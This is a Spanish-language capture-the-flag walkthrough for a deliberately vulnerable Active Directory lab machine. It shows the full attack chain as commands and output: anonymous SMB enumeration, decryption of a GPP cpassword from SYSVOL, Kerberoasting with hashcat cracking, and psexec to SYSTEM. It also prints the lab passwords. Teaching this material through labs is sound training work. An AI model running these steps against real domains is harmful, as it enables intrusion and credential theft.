// 01

Reconocimiento del DC

1
RESOLVER EL DOMINIO Y ESCANEAR
NMAP
$ echo '10.129.5.206 active.htb active' | sudo tee -a /etc/hosts
$ sudo nmap -p- -n -Pn -sS --min-rate 3000 --max-retries 1 10.129.5.206
53/tcp open domain Microsoft DNS
88/tcp open kerberos-sec
135,139,445/tcp open msrpc/netbios/microsoft-ds
389,636/tcp open ldap/ldapssl
3268,3269/tcp open globalcatLDAP
5722,9389,47001/tcp open msdfsr/adws/winrm

// NOTA

Este conjunto de puertos (53, 88, 389, 3268...) es la huella inconfundible de un controlador de dominio de Active Directory. En un DC, el primer reflejo es probar el acceso SMB/LDAP anónimo.

// 02

GPP cpassword en SYSVOL

2
LISTAR SHARES ANÓNIMOS
SMBCLIENT
$ smbclient -N -L //active.htb/
$ smbclient -N //active.htb/Replication -c 'recurse ON; ls'
Replication Disk
SYSVOL Disk
Users Disk
NETLOGON Disk
active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
3
DESCARGAR Y DESCIFRAR EL CPASSWORD
GPP-DECRYPT
$ grep -oE 'cpassword="[^"]*"' /tmp/Groups.xml
$ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
userName="active.htb\SVC_TGS"
GPPstillStandingStrong2k18

// MS14-025: GPP CPASSWORD

Dónde: Groups.xml dentro del SYSVOL replicado, legible por cualquiera con acceso anónimo a Replication.
Qué permite: las Group Policy Preferences cifraban contraseñas con AES — pero Microsoft publicó la clave en su documentación. gpp-decrypt revierte el cifrado al instante: credenciales SVC_TGS:GPPstillStandingStrong2k18.

4
FLAG DE USUARIO
SMBCLIENT
$ smbclient //active.htb/Users -U 'active.htb/SVC_TGS%GPPstillStandingStrong2k18' -c 'get SVC_TGS/Desktop/user.txt /tmp/ac_user.txt'
[flag oculta]

// 03

Kerberoasting y SYSTEM

5
PEDIR LOS TGS DE CUENTAS CON SPN
KERBEROASTING
$ impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.129.5.206 -request
$ hashcat -m 13100 -a 0 /tmp/ac_hash.txt /usr/share/wordlists/rockyou.txt
ServicePrincipalName Name
active/CIFS:445 Administrator
$krb5tgs$23$...:Ticketmaster1968

// KERBEROASTING

Dónde: cualquier usuario autenticado del dominio puede pedir un ticket TGS para cualquier cuenta con SPN.
Qué permite: el ticket va cifrado con el hash NTLM de la contraseña de esa cuenta; si es débil, se rompe offline por diccionario. Aquí el SPN active/CIFS:445 pertenece nada menos que a Administrator.

6
SYSTEM CON PSEXEC
PSEXEC
$ impacket-psexec 'active.htb/Administrator:Ticketmaster1968@active.htb' \
'cmd /c whoami & type C:\Users\Administrator\Desktop\root.txt'
nt authority\system

// 04

Referencia Comandos

smbclient -N
smbclient -N -L //dominio/ ; smbclient -N //dominio/share -c 'recurse ON; ls'
Lista y navega recursos SMB con login anónimo (null session).
gpp-decrypt
gpp-decrypt '<cpassword>'
Descifra el campo cpassword de las Group Policy Preferences usando la clave AES que Microsoft publicó (MS14-025).
impacket-GetUserSPNs
impacket-GetUserSPNs 'dominio/usuario:pass' -dc-ip IP -request
Enumera cuentas con SPN y pide sus tickets TGS (Kerberoasting), listos para crackear offline.
hashcat -m 13100
hashcat -m 13100 -a 0 hash.txt lista.txt
Modo de hashcat específico para tickets Kerberos TGS-REP (krb5tgs), el formato que genera el Kerberoasting.
impacket-psexec
impacket-psexec 'dominio/usuario:pass@host' 'comando'
Ejecuta un comando remoto como SYSTEM vía SMB, usando credenciales administrativas válidas.

// 05

Glosario

SYSVOL / Replication
Carpeta compartida de un controlador de dominio con políticas y scripts de inicio de sesión, replicada entre DCs. Suele ser legible por cualquier usuario autenticado, a veces incluso anónimo.
GPP cpassword (MS14-025)
Las Group Policy Preferences antiguas guardaban contraseñas cifradas con AES en Groups.xml, pero Microsoft publicó la clave de cifrado por error de diseño: el campo se descifra trivialmente.
SPN — Service Principal Name
Identificador que vincula una cuenta de AD con un servicio de red (por ejemplo CIFS). Cualquier cuenta con un SPN es un objetivo potencial de Kerberoasting.
Kerberoasting
Técnica que pide tickets TGS de cuentas con SPN (sin necesitar privilegios) y los crackea offline, porque van cifrados con el hash NTLM de la contraseña de esa cuenta.
psexec (impacket)
Reimplementación del PsExec clásico: despliega un servicio temporal vía SMB y ejecuta comandos con los privilegios de la cuenta usada, típicamente SYSTEM si es administradora.
